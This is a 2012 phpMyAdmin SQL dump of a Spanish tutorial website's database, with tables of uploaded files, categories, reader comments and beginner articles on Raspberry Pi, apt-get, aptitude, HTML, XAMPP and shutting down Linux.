-- phpMyAdmin SQL Dump
-- version 3.5.2.2
-- http://www.phpmyadmin.net
--
-- Servidor: 127.0.0.1
-- Tiempo de generación: 26-11-2012 a las 15:21:29
-- Versión del servidor: 5.5.27
-- Versión de PHP: 5.4.7

SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Base de datos: `po_online`
--

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `po_archivo`
--

CREATE TABLE IF NOT EXISTS `po_archivo` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `nom` varchar(100) NOT NULL,
  `ruta` varchar(200) NOT NULL,
  `tipo` varchar(20) NOT NULL,
  `orden` int(10) unsigned NOT NULL,
  `fecha` date NOT NULL,
  `idseccion` int(10) unsigned NOT NULL,
  `idquien` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=27 ;

--
-- Volcado de datos para la tabla `po_archivo`
--

INSERT INTO `po_archivo` (`id`, `nom`, `ruta`, `tipo`, `orden`, `fecha`, `idseccion`, `idquien`) VALUES
(1, 'RaspberryPi', 'RaspberryPi.jpg', 'jpg', 1, '2012-10-31', 1, 1),
(2, 'apt-get', 'apt-get.jpg', 'jpg', 0, '2012-10-31', 1, 2),
(3, 'apt-get', 'apt-get.pdf', 'pdf', 0, '2012-10-31', 0, 0),
(4, 'Guardarhtml', 'guardarhtml.jpg', 'jpg', 0, '2012-11-01', 0, 0),
(5, 'instalación-aptitude', 'intalacion-aptitude.png', 'png', 0, '2012-11-05', 2, 7),
(6, 'mensaje-apagado-windows', 'mensaje-apagado-windows.jpg', 'jpg', 0, '2012-11-05', 2, 10),
(7, 'apagado windows', 'apagado-windows.jpg', 'jpg', 1, '2012-11-05', 2, 10),
(8, 'apagar linux', 'apagar-linux.png', 'png', 0, '2012-11-05', 2, 8),
(9, 'gdm3setup1', 'gdm3setup1.png', 'png', 0, '2012-11-06', 2, 11),
(10, 'gdm', 'gdm3.6-login-screen-background.png', 'png', 0, '2012-11-06', 2, 11),
(11, 'gdm3', 'gdm-3.6-lock-screen3.png', 'png', 0, '2012-11-06', 2, 11),
(12, 'ifconfig1', 'ifconfig1.jpg', 'jpg', 5, '2012-11-06', 2, 12),
(13, 'ifconfig2', 'ifconfig2.jpg', 'jpg', 6, '2012-11-06', 2, 12),
(14, 'cambiar mac', 'cambiar-mac.jpg', 'jpg', 0, '2012-11-06', 2, 12),
(15, 'cambi-mac2', 'cambio-mac2.jpg', 'jpg', 2, '2012-11-06', 2, 12),
(16, 'Comprobar mac', 'comprobar-mac.jpg', 'jpg', 1, '2012-11-06', 2, 12),
(17, 'bomba lógica', 'comando-peligroso.jpg', 'jpg', 0, '2012-11-06', 2, 13),
(18, 'auditoria-de-red-wep_001', 'auditoria-de-red-wep_001.png', 'png', 0, '2012-11-08', 0, 0),
(19, 'auditoria-de-red-wep_002', 'auditoria-de-red-wep_002.png', 'png', 0, '2012-11-08', 0, 0),
(20, 'auditoria-de-red-wep_003', 'auditoria-de-red-wep_003.png', 'png', 0, '2012-11-08', 0, 0),
(21, 'auditoria-de-red-wep_004', 'auditoria-de-red-wep_004.png', 'png', 0, '2012-11-08', 0, 0),
(22, 'auditoria-de-red-wep_005', 'auditoria-de-red-wep_005.png', 'png', 0, '2012-11-08', 0, 0),
(23, 'auditoria-de-red-wep_006', 'auditoria-de-red-wep_006.png', 'png', 0, '2012-11-08', 0, 0),
(24, 'auditoria-de-red-wep_007', 'auditoria-de-red-wep_007.png', 'png', 0, '2012-11-08', 0, 0),
(25, 'auditoria-de-red-wep_008', 'auditoria-de-red-wep_008.png', 'png', 0, '2012-11-08', 0, 0),
(26, 'auditoria-de-red-wep_009', 'auditoria-de-red-wep_009.png', 'png', 0, '2012-11-08', 0, 0);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `po_categoria`
--

CREATE TABLE IF NOT EXISTS `po_categoria` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `nom` varchar(100) NOT NULL,
  `imagen` varchar(100) NOT NULL,
  `orden` int(10) unsigned NOT NULL,
  `mostrar_breadcrumb` int(10) unsigned NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `keywords` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=7 ;

--
-- Volcado de datos para la tabla `po_categoria`
--

INSERT INTO `po_categoria` (`id`, `nom`, `imagen`, `orden`, `mostrar_breadcrumb`, `description`, `keywords`) VALUES
(1, 'inicio', 'home.png', 1, 0, 'Portal dedicado a la Programación, a Linux y a Windows. Como aprender a programar desde cero cualquier lenguaje de programación, como usar Linux y Windows.', 'desarrollo web,crear una web,informática,programación,aprende a programar desde cero,noticias informática,php,linux ubuntu,programador,programando online'),
(2, 'programación', 'php.png', 3, 1, 'Aprende a programar en cualquier lenguaje desde cero.', 'aprende a programar desde cero,programacion,programador'),
(3, 'linux', 'debian.png', 4, 1, 'Como aprender a usar Linux por pasos', 'linux ubuntu,linux,ubuntu netbook,terminal,consola de ubuntu'),
(4, 'noticias', 'noticia.png', 2, 1, 'Noticias de tecnología/informática en Programando Online', 'noticias informática,informática,nocitias sobre tecnología'),
(5, 'contacto', 'contacto.png', 7, 0, 'Ponte en contacto con el equipo de Programado Online', 'contacto,programando online'),
(6, 'windows', 'windows.png', 6, 1, 'Como aprender a usar Windows por pasos', 'windows 7,windows 8,consola de windows');

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `po_comentario`
--

CREATE TABLE IF NOT EXISTS `po_comentario` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `nom` varchar(100) NOT NULL,
  `correo` varchar(200) NOT NULL,
  `fecha` date NOT NULL,
  `hora` time NOT NULL,
  `texto` text NOT NULL,
  `activo` smallint(6) NOT NULL DEFAULT '0',
  `idcontenido` int(10) unsigned NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=8 ;

--
-- Volcado de datos para la tabla `po_comentario`
--

INSERT INTO `po_comentario` (`id`, `nom`, `correo`, `fecha`, `hora`, `texto`, `activo`, `idcontenido`) VALUES
(1, 'anon', 'anon@anonymous.com', '2012-11-05', '08:19:56', 'muchas gracias me servido de gran ayuda', 0, 2),
(2, 'Luis', 'falso@gmail.com', '2012-11-05', '05:20:44', 'Buen trabajo, me encanta.', 0, 7),
(3, 'netpro', 'falso@gmail.com', '2012-11-05', '09:36:28', 'Me gusta el artículo, estaré pendiente de está sección', 0, 3),
(4, 'oMega_2093', 'aurora.314@gmail.com', '2012-11-05', '10:53:14', 'Hola. Comentar que ese comando sirve en Ubuntu, pero por ejemplo en mi servidor Debian tengo que lanzarlo como sigue:\n\n$ su\n# shutdown -Ph now\n\nDe otro modo no se ejecuta.', 0, 8),
(5, 'Gnu-Ser', 'gnu-ser@gmail.com', '2012-11-06', '04:31:27', 'Voy a probarlo ahora mismo', 0, 13),
(6, 'ruben', 'gonzález@as', '2012-11-07', '04:31:46', 'oasladas', 0, 0),
(7, 'rrr', 'rr@rrrr', '2012-11-07', '04:46:52', 'rrrrrrrrrr', 0, 3);

-- --------------------------------------------------------

--
-- Estructura de tabla para la tabla `po_contenido`
--

CREATE TABLE IF NOT EXISTS `po_contenido` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `titulo` varchar(255) NOT NULL,
  `descripcion` text NOT NULL,
  `texto` text NOT NULL,
  `activo` int(1) unsigned NOT NULL DEFAULT '1',
  `fecha` date NOT NULL,
  `orden` int(11) NOT NULL,
  `idsubcategoria` int(10) unsigned NOT NULL,
  `idtipo` int(10) unsigned NOT NULL DEFAULT '1',
  `description` text NOT NULL,
  `keywords` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=15 ;

--
-- Volcado de datos para la tabla `po_contenido`
--

INSERT INTO `po_contenido` (`id`, `titulo`, `descripcion`, `texto`, `activo`, `fecha`, `orden`, `idsubcategoria`, `idtipo`, `description`, `keywords`) VALUES
(1, 'Raspberry Pi el ordenador de 35 dolares', '', '<p><strong>Raspberry Pi</strong>&nbsp;es un proyecto que est&aacute; creciendo continuamente, acaban de aumentar la RAM a 512 MB por el mismo precio.</p>\r\n<p>Desde hace unos d&iacute;as el c&oacute;digo del driver VideoCore que se ejecuta en el procesador ARM del Raspberry Pi ya es Open Source (Con licencia BSD).</p>\r\n<p>*Esto son buenas noticias para los usuarios de Raspberry Pi porque ser&iacute;a posible la implementaci&oacute;n de <strong>Wayland</strong><strong>&nbsp;</strong><strong>EGL y&nbsp;</strong>mejor integraci&oacute;n con <strong>X.Org</strong>.</p>\r\n<p>En el anuncio oficial afirman que ahora &ldquo;<strong>todo lo que corre en el ARM ya es Open Source&rdquo;.</strong></p>\r\n<p><span style="text-decoration: underline;"><span style="font-size: small; font-family: verdana, geneva;"><em><span style="color: #ff0000;"><strong>Especificaciones t&eacute;cnicas de Raspberry Pi</strong></span></em></span></span></p>\r\n<table style="height: 324px; width: 520px; border-collapse: collapse;" border="1" align="center">\r\n<tbody>\r\n<tr style="background-color: #b2c629;">\r\n<td style="text-align: center;" colspan="2"><span style="font-size: medium; color: #ffffff;"><strong>Raspberry Pi</strong></span></td>\r\n</tr>\r\n<tr>\r\n<td>Precio:</td>\r\n<td>$35</td>\r\n</tr>\r\n<tr>\r\n<td>SoC:</td>\r\n<td><span>Broadcom BCM2835 (CPU, GPU, DSP, and SDRAM)</span></td>\r\n</tr>\r\n<tr>\r\n<td>CPU:</td>\r\n<td><span>700 MHz ARM1176JZF-S core (ARM11 family)</span></td>\r\n</tr>\r\n<tr>\r\n<td><span>GPU:</span></td>\r\n<td><span>Broadcom VideoCore IV, OpenGL ES 2.0, 1080p30 h.264/MPEG-4 AVC high-profile decoder</span></td>\r\n</tr>\r\n<tr>\r\n<td><span>Memoria (SDRAM):</span></td>\r\n<td><span>512 Megabytes</span></td>\r\n</tr>\r\n<tr>\r\n<td>Puertos UBS</td>\r\n<td>2</td>\r\n</tr>\r\n<tr>\r\n<td>Salidas de Audio</td>\r\n<td>3.5 mm jack, HDMI</td>\r\n</tr>\r\n<tr>\r\n<td><span>Salida de Video:&nbsp;</span></td>\r\n<td>RCA, HDMI</td>\r\n</tr>\r\n<tr>\r\n<td>Almacenamiento integrado:</td>\r\n<td>SD / MMC / ranura para SDIO</td>\r\n</tr>\r\n<tr>\r\n<td><span>Puerto Ethernet&nbsp;</span></td>\r\n<td>RJ45 10/100</td>\r\n</tr>\r\n<tr>\r\n<td>Fuente de alimentaci&oacute;n:</td>\r\n<td>5&nbsp;V v&iacute;a Micro USB o GPIO header</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p>&iquest;Cu&aacute;l es la mejor distribuci&oacute;n para Raspberry Pi?</p>\r\n<ul>\r\n<li>&nbsp;&nbsp;&nbsp;Desde mi punto de vista es <span style="color: #0000ff;"><strong><a href="http://downloads.raspberrypi.org/download.php?file=/images/raspbian/2012-10-28-wheezy-raspbian/2012-10-28-wheezy-raspbian.zip" target="_black"><span style="color: #0000ff;">Raspbian</span></a></strong></span></li>\r\n</ul>\r\n<p><strong>&iquest;Cu&aacute;nto cuesta Raspberry Pi con gastos de envi&oacute; incluidos?</strong></p>\r\n<p>Hay 2 empresas que distribuyen por Espa&ntilde;a el Raspberry pi:</p>\r\n<ol>\r\n<li><span style="color: #0000ff;">E<a href="http://www.element14.com/community/groups/raspberry-pi"><span style="color: #0000ff;">lement14</span></a></span></li>\r\n<li><span style="color: #0000ff;"><a href="http://uk.rs-online.com/web/generalDisplay.html?id=raspberrypi"><span style="color: #0000ff;">RS Components</span></a></span></li>\r\n</ol>\r\n<p>Yo lo ped&iacute; mediante la empresa <span style="color: #ff0000;"><strong>Element14</strong></span> y me cost&oacute; <strong>42,50 &euro;</strong> (Gastos incluidos).</p>\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n		\r\n// ]]></script>\r\n</div>', 1, '2012-11-04', 1, 0, 4, 'Raspberry Pi el ordenador de 35 dolares', 'raspberry pi,ordenador barato,pc por 35 dolares'),
(2, 'Manejo de Apt-get', 'Apt-get es un sistema de gestión de paquetes creado por el proyecto Debian,que sirve para instalar paquetes en nuestra distribución.', '<p><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/apt-get.jpg" alt="apt-get.jpg" /></p>\r\n<p>Todos los comandos deben de tener privilegios administrativos, entonces debemos de usar sudo (Superusuario).<br />*<strong>paquete</strong>&nbsp;= nombre del programa (que queremos instalar)</p>\r\n<p>Para<strong>&nbsp;instalar un paquete</strong>:</p>\r\n<pre class="brush: bash;">sudo apt-get install *Ejemplo: sudo apt-get install gpaint</pre>\r\n<p>Para&nbsp;<strong>desinstalar un paquete:</strong></p>\r\n<pre class="brush: bash;">sudo apt-get remove</pre>\r\n<p>Para&nbsp;<strong>desinstalar &ldquo;cosas Innecesarias&rdquo;:</strong></p>\r\n<pre class="brush: bash;">sudo apt-get autoremove</pre>\r\n<p><strong>Actualizar el &iacute;ndice de paquetes:</strong>&nbsp;El &iacute;ndice de paquetes de APT es esencialmente una base de datos de paquetes&nbsp;disponibles en los repositorios definidos en el archivo /etc/apt/sources.list. Para actualizar el &iacute;ndice local de paquetes&nbsp;con los &uacute;ltimos cambios realizados en los repositorios.</p>\r\n<pre class="brush: bash;">sudo apt-get update</pre>\r\n<p><span>*Este comando debe ejecutarse peri&oacute;dicamente para actualizar las listas de aplicaciones. Tambi&eacute;n debe ejecutarse despu&eacute;s de hacer&nbsp;cambios en /etc/apt/sources.list o en /etc/apt/preferences.</span></p>\r\n<p><br /><strong>Actualizar paquetes:</strong>&nbsp;Con el tiempo, ciertos paquetes instalados en su equipo pueden tener disponibles versiones m&aacute;s actualizadas en el repositorio de paquetes (por ejemplo actualizaciones de seguridad).</p>\r\n<pre class="brush: bash;">sudo apt-get upgrade</pre>\r\n<p><strong>B&uacute;squeda de paquetes:</strong>&nbsp;Busca los paquetes disponibles con la palabra clave</p>\r\n<pre class="brush: bash;">sudo apt-cache search *Ejemplo apt-cache search gpaint</pre>\r\n<p><strong>Muestra de los programas instalados:</strong>&nbsp;Desplega una lista con los programas instalados.</p>\r\n<pre class="brush: bash;">sudo apt-cache pkgnames</pre>\r\n<p>*Para buscar un programa en concreto:&nbsp;<span>apt-cache pkgnames gpaint</span></p>\r\n<p><br /><strong>Muestra informaci&oacute;n sobre el paquete:</strong>&nbsp;Despliega en pantalla informaci&oacute;n b&aacute;sica sobre el paquete.</p>\r\n<pre class="brush: bash;">sudo apt-cache show</pre>\r\n<p><strong>Limpieza:</strong>&nbsp;Ejecute este comando peri&oacute;dicamente para eliminar los archivo .deb de programas que ya no est&aacute;n instalados en el sistema. Este comando permite recuperar cantidades apreciables de espacio en disco duro.</p>\r\n<pre class="brush: bash;">sudo apt-get autoclean</pre>\r\n<p>*Si la necesidad de espacio en disco es muy urgente, el comando <span style="color: #ff0000;">apt-get clean</span>&nbsp;es todav&iacute;a m&aacute;s radical, ya que tambi&eacute;n remover&aacute; los <em>*.deb*</em> de los programas instalados.</p>\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n\r\n// ]]></script>\r\n</div>\r\n<p style="text-align: center;"><span style="text-decoration: underline;"><span style="font-size: 14px;"><strong><a style="color: blue; text-decoration: underline;" href="archivos/apt-get.pdf">Descargar el contenido en pdf</a></strong></span></span></p>', 1, '2012-11-02', 1, 1, 3, 'Apt-get es un sistema de gestión de paquetes creado por el proyecto Debian,que sirve para instalar paquetes en Ubuntu,Linux Mint y Debian.', 'apt-get,instalar paquetes en Ubuntu,desistalar paquetes en Ubuntu,actualizar paquetes'),
(3, 'Introdución a HTML', 'En este artículo se muestra como es una estructura básica HTML y como guardar un documento HTML con un editor de textos como Notepadd++.', '<ol style="font-weight: bold; color: #007095;">\r\n<li>INTRODUCCI&Oacute;N</li>\r\n</ol>\r\n<p>La siglas de <strong>HTML</strong> son HyperText Markup Language (lenguaje de marcado de hipertexto), hace referencia al lenguaje de marcado predominante para la elaboraci&oacute;n de p&aacute;ginas web que se utiliza para describir y traducir la estructura y la informaci&oacute;n en forma de texto, as&iacute; como para complementar el texto con objetos tales como im&aacute;genes. El <strong>HTML</strong>se escribe en forma de &laquo;etiquetas&raquo;, rodeadas por corchetes angulares (&lt;,&gt;).</p>\r\n<ol style="font-weight: bold; color: #007095;" start="2">\r\n<li>ESTRUCTURA MUY B&Aacute;SICA DEL DOCUMENTO</li>\r\n</ol>\r\n<pre class="brush: xml">	((html))\r\n		((head))\r\n			((title))Titulo de Ventana((/title))\r\n		((/head))\r\n		((body))\r\n			((--(Como por ejemplo el texto de una noticia)--))\r\n		((body))\r\n	((html))\r\n</pre>\r\n<p>* M&aacute;s adelante explicare en un art&iacute;culo la estructura del documento completa, como por ejemplo los <span style="color: blue; font-weight: bold;">metas, script,</span> etc.</p>\r\n<ol style="font-weight: bold; color: #007095;" start="2">\r\n<li>ETIQUETAS B&Aacute;SICAS</li>\r\n</ol>\r\n<ul style="margin-left: 8px;" type="square">\r\n<li>Los comentarios en <strong>HTML</strong> se escriben de la siguiente manera: ((<span style="color: green; font-family: verdana; font-size: 12px;">!-- Esto es un comentario --))</span></li>\r\n<li>Un cambio de l&iacute;nea seria de la siguiente manera <span style="color: blue; font-family: verdana; font-size: 12px;">((br /))</span></li>\r\n<li>Los p&aacute;rrafos se escriben de la siguiente manera <span style="color: blue; font-family: verdana; font-size: 12px;">((p))Esto es un p&aacute;rrafo((/p))</span> Los p&aacute;rrafos, por defecto producen un cambio de l&iacute;nea antes y despu&eacute;s del p&aacute;rrafo.</li>\r\n<li>Las cabeceras en <strong>HTML</strong>tienen diferentes niveles(Van del 1 al 6). Por ejemplo:\r\n<ul>\r\n<li><span style="color: blue; font-family: verdana; font-size: 20px; padding-top: 10px; display: block;">((h1))Est&aacute; es la cabecera m&aacute;s grande((/h1))</span></li>\r\n<li><span style="color: blue; font-family: verdana; font-size: 13px; padding-top: 10px; display: block; padding-bottom: 10px;">((h6))Est&aacute; es la cabecera m&aacute;s peque&ntilde;a((/h6))</span></li>\r\n</ul>\r\n</li>\r\n<li>Como poner negrita, cursiva y subrayado en <strong>HTML</strong>:<br />\r\n<ul>\r\n<li><span style="color: blue; font-family: verdana; font-size: 12px; font-weight: bold; padding-top: 10px; display: block;">((b))Texto en negrita((/b))</span></li>\r\n<li><span style="color: blue; font-family: verdana; font-size: 12px; font-style: italic;">((i))Texto en cursiva((/i))</span></li>\r\n<li><span style="color: blue; font-family: verdana; font-size: 12px; text-decoration: underline;">((u))Texto con subrayado((/u))</span></li>\r\n</ul>\r\n</li>\r\n</ul>\r\n<ol style="font-weight: bold; color: #007095;" start="3">\r\n<li>EL HOLA MUNDO EN <strong>HTML</strong></li>\r\n</ol>\r\n<p>Para escribir <strong>HTML</strong> necesitamos un editor de texto, yo siempre utilizo <a style="text-decoration: underline;" href="http://notepad-plus-plus.org">Notepadd++</a>.<br /> <span style="font-size: 13px;">*Para que el navegador interprete el HTML tenemos que guardar el documento de <span style="color: red;">.html.</span></span></p>\r\n<div style="width: 571px; margin: 0 auto;"><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/guardarhtml.jpg" alt="guardarhtml.jpg" /></div>\r\n<p>Una vez guardado el documento <strong>html</strong>, vamos a implementar el c&oacute;digo:</p>\r\n<pre class="brush: xml">	((html))\r\n	((head))\r\n		((title))Hola Mundo((/title))\r\n	((/head))\r\n	((body))\r\n		((p))\r\n			((b))\r\n				((u))\r\n					Hola Mundo\r\n				((/u))\r\n			((/b))\r\n		((/p))\r\n	((/body))\r\n	((/html))\r\n</pre>\r\n<p>Una vez guardado el documento <strong>html</strong>, lo abrimos con nuestro navegador favorito y veremos <strong>hola mundo</strong>.</p>\r\n<!-- Publicidad -->\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n\r\n// ]]></script>\r\n</div>', 1, '2012-11-02', 2, 2, 2, 'Estructura muy básica del HTML y como guardar un documento HTML con un editor de textos como Notepadd++.', 'introdución a html,html,guardar en formato html'),
(6, 'Instalación de Xampp y el Hola Mundo', 'Como instalar el Xampp en Windows y como ejecutar nuestro primer Script en PHP', '<ul style="font-weight: bold; color: #007095;">\r\n<li>&iquest;QU&Eacute; ES XAMPP?</li>\r\n</ul>\r\n<p><strong>XAMPP</strong> es un servidor independiente de plataforma, software libre, que consiste principalmente en la base de datos MySQL, el servidor web Apache y los int&eacute;rpretes para lenguajes de script: PHP y Perl.</p>\r\n<ul style="font-weight: bold; color: #007095;">\r\n<li>INSTALACI&Oacute;N DE XAMPP</li>\r\n</ul>\r\n<div style="margin-bottom: 10px; margin-left: 14px;">Lo primero es bajar <strong>Xampp</strong> de la p&aacute;gina oficial que es: <a style="color: blue; text-decoration: underline;" href="http://www.apachefriends.org" target="_black">www.apachefriends.org</a>.</div>\r\n<p><iframe style="display: block; margin-left: auto; margin-right: auto;" src="http://www.youtube.com/embed/TYJEHy0I7Ew" frameborder="0" width="560" height="315"></iframe></p>\r\n<p>Una vez instalado, para acceder a el Servidor <strong>Apache</strong> escribimos en la barra de navegaci&oacute;n del navegador <strong><em>localhost</em></strong>, y veremos los archivos y/o documentos que hay en nuestro servidor.</p>\r\n<p>*Para meter archivos en el servidor <strong>Apache</strong>, tenemos que meterlos dentro de la carpeta <span style="color: blue;">htdocs</span> que en mi caso est&aacute; en la ruta<strong> C:/xampp/htdocs/</strong></p>\r\n<ul style="font-weight: bold; color: #007095;">\r\n<li>HOLA MUNDO EN PHP</li>\r\n</ul>\r\n<p>Creamos un nuevo documento y lo guardamos como <span style="color: #245431; font-weight: bold;">hola-mundo.php</span> en la carpeta <span style="color: blue;">htdocs</span> para que nuestro servidor <strong>Apache</strong> lo interprete.</p>\r\n<pre class="brush:php">	((?php\r\n		echo "hola mundo";\r\n	?))\r\n	</pre>\r\n<p>Ponemos est&aacute; ruta en nuestro navegador: <span style="color: green; font-weight: bold;">localhost/hola-mundo.php</span> y nos aparecer&aacute; <span style="color: blue; font-size: 14px;">hola mundo</span>.</p>\r\n<!-- Publicidad -->\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n\r\n// ]]></script>\r\n</div>', 1, '2012-11-02', 0, 3, 2, 'Como instalar el Xampp en Windows y como ejecutar nuestro primer Script en PHP.', 'php,instalación de Xampp,ejemplos en php,'),
(7, 'Manual de aptitude', 'Es un sistema de gestión de paquetes pero al contrario de apt-get, aptitude recuerda las dependencias que se han aplicado en la instalación de un paquete.', '<p><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/intalacion-aptitude.png" alt="intalacion-aptitude.png" /></p>\r\n<p>Existen dos formas de instalar programas en modo texto: con <strong>aptitude</strong> y con <strong>apt-get</strong>.(Ver art&iacute;culo de <a style="color: blue; text-decoration: underline; font-weight: bold;" href="index.php?categoria=linux&amp;subcategoria=terminal&amp;id=2">apt-get</a>)<br /><br /> Ambos programas son muy similares, salvo en un detalle: <strong>aptitude</strong> recuerda las dependencias que se han aplicado en la instalaci&oacute;n de un paquete. Esto significa que si se instala o actualiza una aplicaci&oacute;n con <strong>aptitude</strong> y luego se quiere desinstalar, <strong>aptitude</strong> borrar&aacute; el programa junto con todas sus dependencias (excepto si son usadas por otros paquetes). Si se instala con <strong>apt-get</strong> o con entorno gr&aacute;fico Synaptic, la desinstalaci&oacute;n borrar&aacute; s&oacute;lo el paquete especificado, pero no las dependencias.</p>\r\n<p style="font-weight: bold; text-decoration: underline; font-size: 15px;">Abrimos una terminal v&iacute;a Aplicaciones &raquo; Accesorios &raquo; Terminal.</p>\r\n<p><strong>Instalar paquetes:</strong></p>\r\n<pre class="brush: bash;">sudo aptitude install ((paquetes)) </pre>\r\n<p><strong>Desinstalar paquetes:</strong></p>\r\n<pre class="brush: bash;">sudo aptitude remove ((paquetes))</pre>\r\n<p><strong>Desinstalar paquetes (incluyendo archivos de configuraci&oacute;n): </strong></p>\r\n<pre class="brush: bash;">sudo aptitude purge ((paquetes))</pre>\r\n<p><strong>Actualizar la lista de paquetes disponibles: </strong></p>\r\n<pre class="brush: bash;">sudo aptitude update </pre>\r\n<p><strong>Actualizar el sistema con las actualizaciones de paquetes disponibles: </strong></p>\r\n<pre class="brush: bash;">sudo aptitude upgrade </pre>\r\n<p><strong>Para buscar paquetes: </strong></p>\r\n<pre class="brush: bash;">sudo aptitude search ((palabra clave)) </pre>\r\n<p><strong>Obtener una lista de opciones del comando: </strong></p>\r\n<pre class="brush: bash;">sudo aptitude help </pre>\r\n<p style="font-size: 15px;">*<span style="font-weight: bold; font-style: italic;">NOTA:</span> Cuando un paquete no queda correctamente instalado podemos usar desde el terminal estos <strong>2</strong> comandos:</p>\r\n<p><strong>Arregla un paquete mal instalado:</strong></p>\r\n<pre class="brush: bash;">sudo apt-get install -f </pre>\r\n<p><strong>Este comando instala el paquete y a continuaci&oacute;n lo vuelve a reinstalar:</strong></p>\r\n<pre class="brush: bash;">sudo apt-get install -- reinstall ((paquete)) </pre>\r\n<!-- Publicidad -->\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n\r\n// ]]></script>\r\n</div>', 1, '2012-11-05', 0, 1, 3, 'Manual de aptitude', 'aptitude,instalar paquetes en ubuntu'),
(8, 'Apagar y/o Reiniciar Linux desde la Terminal', 'Como apagar y/o reiniciar Linux desde la Terminal', '<p><img style="display: block; margin-left: auto; margin-right: auto;" src="archivos/apagar-linux.png" alt="apagar-linux.png" /></p>\r\n<p><strong>Para apagar el sistema :</strong></p>\r\n<pre class="brush: bash;">sudo shutdown -h now </pre>\r\n<p>El ordenador se apaga seg&uacute;n tecleas el comando.</p>\r\n<pre class="brush: bash;">sudo shutdown -h +120</pre>\r\n<p>El ordenador se apaga cuando pasen XX minutos (en este caso 120 minutos).</p>\r\n<pre class="brush: bash;">sudo shutdown -h 4:10 </pre>\r\n<p>Si lo queremos apagar a XX<strong>:</strong>XX hora, con formato <strong>24 horas</strong> (en este caso le estamos diciendo que se apage a las 4:10).<br /> <span style="font-size: 11px;">*Para reinicialo es lo mismo pero cambiando la <strong>-h</strong> por la <strong>-r</strong></span></p>\r\n<p><strong>Cancelar Reinicio y/o Apagado</strong></p>\r\n<pre class="brush: bash;">sudo shutdown -c</pre>\r\n<!-- Publicidad -->\r\n<div style="width: 468px; margin: 0 auto;">\r\n<script type="text/javascript">// <![CDATA[\r\ngoogle_ad_client = "ca-pub-2969828403799030";\r\n		/* Horizontal mediano */\r\n		google_ad_slot = "5838362340";\r\n		google_ad_width = 468;\r\n		google_ad_height = 15;\r\n// ]]></script>\r\n<script type="text/javascript" src="http://pagead2.googlesyndication.com/pagead/show_ads.js">// <![CDATA[\r\n		\r\n// ]]></script>\r\n</div>', 1, '2012-11-05', 0, 1, 3, 'apagar linux desde la terminal', 'apagar linux desde la terminal,apagar linux'),
